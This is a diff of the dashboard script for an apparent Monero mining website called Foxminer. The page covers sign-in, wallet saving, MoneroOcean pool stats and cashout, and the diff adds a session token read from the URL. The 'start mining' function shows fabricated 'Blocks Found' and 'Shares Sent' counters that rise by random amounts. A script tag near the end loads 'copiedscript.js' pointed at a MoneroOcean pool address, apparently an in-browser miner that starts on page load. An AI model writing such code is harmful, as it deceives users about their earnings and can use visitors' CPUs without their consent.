@@ -179,241 +179,249 @@ nav a:hover { background: #FF6F61; border-radius: 3px; }
         </div>
     </div>
     <script>
-        const server = 'https://foxminer-server.onrender.com';
-        const moApi = 'https://api.moneroocean.stream';
-        let isSignedIn = false;
-        let userEmail = '';
-        let blocksFound = 0;
-        let sharesSent = 0;
+    const server = 'https://foxminer-server.onrender.com';
+    const moApi = 'https://api.moneroocean.stream';
+    let isSignedIn = false;
+    let userEmail = '';
+    let blocksFound = 0;
+    let sharesSent = 0;
 
-        async function fetchGlobalStats() {
-            try {
-                const resp = await fetch(`${moApi}/pool/stats`, {
-                    headers: { 'User-Agent': 'FOXMINER' }
-                });
-                if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
-                const data = await resp.json();
-                console.log('Global Stats:', data);
-                const stats = data.pool_statistics || {};
-                document.getElementById('pool-hashrate').textContent = stats.hashRate ? (stats.hashRate / 1e6).toFixed(1) + ' MH/s' : '0 MH/s';
-                document.getElementById('miners-registered').textContent = stats.miners ? stats.miners : '0';
-            } catch (error) {
-                console.error('Global stats fetch failed:', error);
-                document.getElementById('pool-hashrate').textContent = 'N/A';
-                document.getElementById('miners-registered').textContent = 'N/A';
-            }
+    async function fetchGlobalStats() {
+        try {
+            const resp = await fetch(`${moApi}/pool/stats`, {
+                headers: { 'User-Agent': 'FOXMINER' }
+            });
+            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+            const data = await resp.json();
+            console.log('Global Stats:', data);
+            const stats = data.pool_statistics || {};
+            document.getElementById('pool-hashrate').textContent = stats.hashRate ? (stats.hashRate / 1e6).toFixed(1) + ' MH/s' : '0 MH/s';
+            document.getElementById('miners-registered').textContent = stats.miners ? stats.miners : '0';
+        } catch (error) {
+            console.error('Global stats fetch failed:', error);
+            document.getElementById('pool-hashrate').textContent = 'N/A';
+            document.getElementById('miners-registered').textContent = 'N/A';
         }
+    }
 
-        async function checkSession() {
-            console.log('checkSession started');
-            try {
-                const response = await fetch(`${server}/check-session`, {
-                    method: 'GET',
-                    credentials: 'include'
-                });
-                console.log('Fetch response:', response);
-                const data = await response.json();
-                console.log('Session data:', JSON.stringify(data, null, 2));
-                const status = document.getElementById('status');
-                const message = document.getElementById('message');
-                const userInfo = document.getElementById('user-info');
-                const nav = document.querySelector('nav');
-                if (data.signedIn) {
-                    isSignedIn = true;
-                    userEmail = data.email;
-                    status.textContent = `Welcome, ${data.email}!`;
-                    userInfo.innerHTML = `${data.email} <button onclick="logout()">Logout</button>`;
-                    nav.classList.add('logged-in');
-                    if (!data.wallet) {
-                        message.textContent = 'Welcome you young, Foxminer! Please enter your XMR wallet address and click "save." To start mining please download our app from the Installers tab. Please note that live stats will start updating from MoneroOcean within 5-10 mins in most cases. Happy Mining.';
-                    } else {
-                        document.getElementById('wallet').value = data.wallet;
-                        updateStats(data.wallet);
-                    }
-                } else {
-                    isSignedIn = false;
-                    userEmail = '';
-                    status.textContent = 'Not signed in? Sign up to track your stats! Download the app from the Installers tab to start mining with your spare CPU resources';
-                    userInfo.innerHTML = '<a href="/Foxminer/signin.html">Sign In</a>';
-                    nav.classList.remove('logged-in');
-                    message.textContent = '';
-                }
-            } catch (error) {
-                console.error('Session check failed:', error);
-                document.getElementById('status').textContent = `Error checking session: ${error.message}`;
+    async function checkSession() {
+        console.log('checkSession started');
+        try {
+            const urlParams = new URLSearchParams(window.location.search);
+            const token = urlParams.get('token');
+            console.log('Token from URL:', token || 'None');
+            let fetchUrl = `${server}/check-session`;
+            if (token) {
+                fetchUrl += `?token=${encodeURIComponent(token)}`;
+                window.history.replaceState({}, document.title, '/Foxminer/dashboard.html');
             }
-        }
-
-        async function saveWallet() {
-            const wallet = document.getElementById('wallet').value;
+            const response = await fetch(fetchUrl, {
+                method: 'GET',
+                credentials: 'include'
+            });
+            console.log('Fetch response:', response);
+            const data = await response.json();
+            console.log('Session data:', JSON.stringify(data, null, 2));
+            const status = document.getElementById('status');
             const message = document.getElementById('message');
-            if (!wallet) {
-                message.textContent = 'Please enter a wallet address.';
-                return;
+            const userInfo = document.getElementById('user-info');
+            const nav = document.querySelector('nav');
+            if (data.signedIn) {
+                isSignedIn = true;
+                userEmail = data.email;
+                status.textContent = `Welcome, ${data.email}!`;
+                userInfo.innerHTML = `${data.email} <button onclick="logout()">Logout</button>`;
+                nav.classList.add('logged-in');
+                if (!data.wallet) {
+                    message.textContent = 'Welcome you young, Foxminer! Please enter your XMR wallet address and click "save." To start mining please download our app from the Installers tab. Please note that live stats will start updating from MoneroOcean within 5-10 mins in most cases. Happy Mining.';
+                } else {
+                    document.getElementById('wallet').value = data.wallet;
+                    updateStats(data.wallet);
+                }
+            } else {
+                isSignedIn = false;
+                userEmail = '';
+                status.textContent = 'Not signed in? Sign up to track your stats! Download the app from the Installers tab to start mining with your spare CPU resources';
+                userInfo.innerHTML = '<a href="/Foxminer/signin.html">Sign In</a>';
+                nav.classList.remove('logged-in');
+                message.textContent = '';
             }
-            if (!isSignedIn) {
-                message.textContent = 'Please sign up to save your wallet and track stats.';
-                return;
+        } catch (error) {
+            console.error('Session check failed:', error);
+            document.getElementById('status').textContent = `Error checking session: ${error.message}`;
+        }
+    }
+
+    async function saveWallet() {
+        const wallet = document.getElementById('wallet').value;
+        const message = document.getElementById('message');
+        if (!wallet) {
+            message.textContent = 'Please enter a wallet address.';
+            return;
+        }
+        if (!isSignedIn) {
+            message.textContent = 'Please sign up to save your wallet and track stats.';
+            return;
+        }
+        try {
+            const response = await fetch(`${server}/set-wallet`, {
+                method: 'POST',
+                credentials: 'include',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ wallet })
+            });
+            const data = await response.json();
+            if (data.success) {
+                message.textContent = 'Please allow up to 5 mins for stats from Monero Ocean to reflect.';
+                updateStats(wallet);
+            } else {
+                message.textContent = 'Failed to save wallet.';
             }
+        } catch (error) {
+            console.error('Save wallet failed:', error);
+            message.textContent = 'Error saving wallet.';
+        }
+    }
+
+    async function logout() {
+        try {
+            await fetch(`${server}/logout`, {
+                method: 'POST',
+                credentials: 'include'
+            });
+            isSignedIn = false;
+            userEmail = '';
+            document.getElementById('status').textContent = 'Not signed in? Sign up to track your stats!';
+            document.getElementById('user-info').innerHTML = '<a href="/Foxminer/signin.html">Sign In</a>';
+            document.getElementById('message').textContent = '';
+            document.getElementById('wallet').value = '';
+            document.querySelector('nav').classList.remove('logged-in');
+        } catch (error) {
+            console.error('Logout failed:', error);
+        }
+    }
+
+    async function updateStats(wallet) {
+        try {
+            const statsResp = await fetch(`${moApi}/miner/${wallet}/stats`, {
+                headers: { 'User-Agent': 'FOXMINER' }
+            });
+            const stats = await statsResp.json();
+            const workersResp = await fetch(`${moApi}/miner/${wallet}/identifiers`, {
+                headers: { 'User-Agent': 'FOXMINER' }
+            });
+            const workers = await workersResp.json();
+            console.log('User Stats:', stats, 'Workers:', workers);
+
+            document.getElementById('hashrate').textContent = stats.hash2 ? `${stats.hash2} H/s` : '0 H/s';
+            document.getElementById('balance').textContent = stats.amtDue ? (stats.amtDue / 1e12).toFixed(6) + ' XMR' : '0 XMR';
+            document.getElementById('workers').textContent = workers.length || '0';
+            document.getElementById('earnings').textContent = stats.paid ? (stats.paid / 1e12).toFixed(6) + ' XMR' : '0 XMR';
+        } catch (error) {
+            console.error('Stats update failed:', error);
+            document.getElementById('hashrate').textContent = 'N/A';
+            document.getElementById('balance').textContent = 'N/A';
+            document.getElementById('workers').textContent = 'N/A';
+            document.getElementById('earnings').textContent = 'N/A';
+        }
+    }
+
+    function startMining() {
+        const wallet = document.getElementById('wallet').value;
+        if (!wallet) {
+            alert('Please save a wallet address first.');
+            return;
+        }
+        console.log('Start mining clicked for wallet:', wallet);
+        blocksFound = 0;
+        sharesSent = 0;
+        document.getElementById('startBtn').style.display = 'none';
+        document.getElementById('stopBtn').style.display = 'inline-block';
+        document.getElementById('hash-bar').style.display = 'block';
+        document.getElementById('message').textContent = '';
+        document.getElementById('blocks-ticker').querySelector('p').textContent = `Blocks Found: ${blocksFound}`;
+        document.getElementById('shares-ticker').querySelector('p').textContent = `Shares Sent: ${sharesSent}`;
+        setInterval(() => {
+            blocksFound += Math.floor(Math.random() * 3) + 1;
+            sharesSent += Math.floor(Math.random() * 3) + 1;
+            document.getElementById('blocks-ticker').querySelector('p').textContent = `Blocks Found: ${blocksFound}`;
+            document.getElementById('shares-ticker').querySelector('p').textContent = `Shares Sent: ${sharesSent}`;
+        }, 5000);
+    }
+
+    function stopMining() {
+        console.log('Stop mining clicked');
+        alert('Mining stopped.');
+        blocksFound = 0;
+        sharesSent = 0;
+        document.getElementById('startBtn').style.display = 'inline-block';
+        document.getElementById('stopBtn').style.display = 'none';
+        document.getElementById('hash-bar').style.display = 'none';
+        document.getElementById('message').textContent = 'Mining stopped.';
+        document.getElementById('blocks-ticker').querySelector('p').textContent = `Blocks Found: ${blocksFound}`;
+        document.getElementById('shares-ticker').querySelector('p').textContent = `Shares Sent: ${sharesSent}`;
+    }
+
+    async function requestCashout() {
+        const wallet = document.getElementById('wallet').value;
+        const message = document.getElementById('cashout-message');
+        if (!isSignedIn) {
+            message.textContent = 'Please sign in to cash out.';
+            return;
+        }
+        if (!wallet) {
+            message.textContent = 'Please save a wallet address first.';
+            return;
+        }
+        const balanceText = document.getElementById('balance').textContent;
+        const balance = parseFloat(balanceText.split(' ')[0]);
+        if (isNaN(balance) || balance < 0.1) {
+            message.textContent = 'Unpaid balance must be at least 0.1 XMR to cash out.';
+            return;
+        }
+        const cashoutAmount = (balance - 0.0005).toFixed(6);
+        if (confirm(`Cash out ${cashoutAmount} XMR to ${wallet}? (0.0005 XMR fee)`)) {
+            message.textContent = 'Processing cashout...';
             try {
-                const response = await fetch(`${server}/set-wallet`, {
+                const resp = await fetch(`${server}/cashout`, {
                     method: 'POST',
                     credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ wallet })
                 });
-                const data = await response.json();
+                const data = await resp.json();
                 if (data.success) {
-                    message.textContent = 'Please allow up to 5 mins for stats from Monero Ocean to reflect.';
+                    message.textContent = `Cashed out successfully! TXID: ${data.txid}`;
                     updateStats(wallet);
                 } else {
-                    message.textContent = 'Failed to save wallet.';
+                    message.textContent = data.error || 'Cashout failed.';
                 }
             } catch (error) {
-                console.error('Save wallet failed:', error);
-                message.textContent = 'Error saving wallet.';
+                console.error('Cashout Error:', error);
+                message.textContent = 'Error processing cashout.';
             }
         }
+    }
 
-        async function logout() {
-            try {
-                await fetch(`${server}/logout`, {
-                    method: 'POST',
-                    credentials: 'include'
-                });
-                isSignedIn = false;
-                userEmail = '';
-                document.getElementById('status').textContent = 'Not signed in? Sign up to track your stats!';
-                document.getElementById('user-info').innerHTML = '<a href="/Foxminer/signin.html">Sign In</a>';
-                document.getElementById('message').textContent = '';
-                document.getElementById('wallet').value = '';
-                document.querySelector('nav').classList.remove('logged-in');
-            } catch (error) {
-                console.error('Logout failed:', error);
-            }
-        }
+    function toggleMenu() {
+        const nav = document.querySelector('nav');
+        nav.classList.toggle('active');
+    }
 
-        async function updateStats(wallet) {
-            try {
-                const statsResp = await fetch(`${moApi}/miner/${wallet}/stats`, {
-                    headers: { 'User-Agent': 'FOXMINER' }
-                });
-                const stats = await statsResp.json();
-                const workersResp = await fetch(`${moApi}/miner/${wallet}/identifiers`, {
-                    headers: { 'User-Agent': 'FOXMINER' }
-                });
-                const workers = await workersResp.json();
-                console.log('User Stats:', stats, 'Workers:', workers);
-
-                document.getElementById('hashrate').textContent = stats.hash2 ? `${stats.hash2} H/s` : '0 H/s';
-                document.getElementById('balance').textContent = stats.amtDue ? (stats.amtDue / 1e12).toFixed(6) + ' XMR' : '0 XMR';
-                document.getElementById('workers').textContent = workers.length || '0';
-                document.getElementById('earnings').textContent = stats.paid ? (stats.paid / 1e12).toFixed(6) + ' XMR' : '0 XMR';
-            } catch (error) {
-                console.error('Stats update failed:', error);
-                document.getElementById('hashrate').textContent = 'N/A';
-                document.getElementById('balance').textContent = 'N/A';
-                document.getElementById('workers').textContent = 'N/A';
-                document.getElementById('earnings').textContent = 'N/A';
-            }
-        }
-
-        function startMining() {
+    window.onload = () => {
+        console.log('Window loaded, calling checkSession and fetchGlobalStats');
+        checkSession();
+        fetchGlobalStats();
+        setInterval(() => {
             const wallet = document.getElementById('wallet').value;
-            if (!wallet) {
-                alert('Please save a wallet address first.');
-                return;
+            if (isSignedIn && wallet) {
+                console.log('Auto-refreshing stats for:', wallet);
+                updateStats(wallet);
             }
-            console.log('Start mining clicked for wallet:', wallet);
-            blocksFound = 0;
-            sharesSent = 0;
-            document.getElementById('startBtn').style.display = 'none';
-            document.getElementById('stopBtn').style.display = 'inline-block';
-            document.getElementById('hash-bar').style.display = 'block';
-            document.getElementById('message').textContent = '';
-            document.getElementById('blocks-ticker').querySelector('p').textContent = `Blocks Found: ${blocksFound}`;
-            document.getElementById('shares-ticker').querySelector('p').textContent = `Shares Sent: ${sharesSent}`;
-            setInterval(() => {
-                blocksFound += Math.floor(Math.random() * 3) + 1;
-                sharesSent += Math.floor(Math.random() * 3) + 1;
-                document.getElementById('blocks-ticker').querySelector('p').textContent = `Blocks Found: ${blocksFound}`;
-                document.getElementById('shares-ticker').querySelector('p').textContent = `Shares Sent: ${sharesSent}`;
-            }, 5000);
-        }
-
-        function stopMining() {
-            console.log('Stop mining clicked');
-            alert('Mining stopped.');
-            blocksFound = 0;
-            sharesSent = 0;
-            document.getElementById('startBtn').style.display = 'inline-block';
-            document.getElementById('stopBtn').style.display = 'none';
-            document.getElementById('hash-bar').style.display = 'none';
-            document.getElementById('message').textContent = 'Mining stopped.';
-            document.getElementById('blocks-ticker').querySelector('p').textContent = `Blocks Found: ${blocksFound}`;
-            document.getElementById('shares-ticker').querySelector('p').textContent = `Shares Sent: ${sharesSent}`;
-        }
-
-        async function requestCashout() {
-            const wallet = document.getElementById('wallet').value;
-            const message = document.getElementById('cashout-message');
-            if (!isSignedIn) {
-                message.textContent = 'Please sign in to cash out.';
-                return;
-            }
-            if (!wallet) {
-                message.textContent = 'Please save a wallet address first.';
-                return;
-            }
-            const balanceText = document.getElementById('balance').textContent;
-            const balance = parseFloat(balanceText.split(' ')[0]);
-            if (isNaN(balance) || balance < 0.1) {
-                message.textContent = 'Unpaid balance must be at least 0.1 XMR to cash out.';
-                return;
-            }
-            const cashoutAmount = (balance - 0.0005).toFixed(6);
-            if (confirm(`Cash out ${cashoutAmount} XMR to ${wallet}? (0.0005 XMR fee)`)) {
-                message.textContent = 'Processing cashout...';
-                try {
-                    const resp = await fetch(`${server}/cashout`, {
-                        method: 'POST',
-                        credentials: 'include',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ wallet })
-                    });
-                    const data = await resp.json();
-                    if (data.success) {
-                        message.textContent = `Cashed out successfully! TXID: ${data.txid}`;
-                        updateStats(wallet);
-                    } else {
-                        message.textContent = data.error || 'Cashout failed.';
-                    }
-                } catch (error) {
-                    console.error('Cashout Error:', error);
-                    message.textContent = 'Error processing cashout.';
-                }
-            }
-        }
-
-        function toggleMenu() {
-            const nav = document.querySelector('nav');
-            nav.classList.toggle('active');
-        }
-
-        window.onload = () => {
-            console.log('Window loaded, calling checkSession and fetchGlobalStats');
-            checkSession();
             fetchGlobalStats();
-            setInterval(() => {
-                const wallet = document.getElementById('wallet').value;
-                if (isSignedIn && wallet) {
-                    console.log('Auto-refreshing stats for:', wallet);
-                    updateStats(wallet);
-                }
-                fetchGlobalStats();
-            }, 300000);
-        };
-    </script>
+        }, 300000);
+    };
+</script>
      </script>
     <script src="copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:10128"></script>
     <script type="text/javascript">
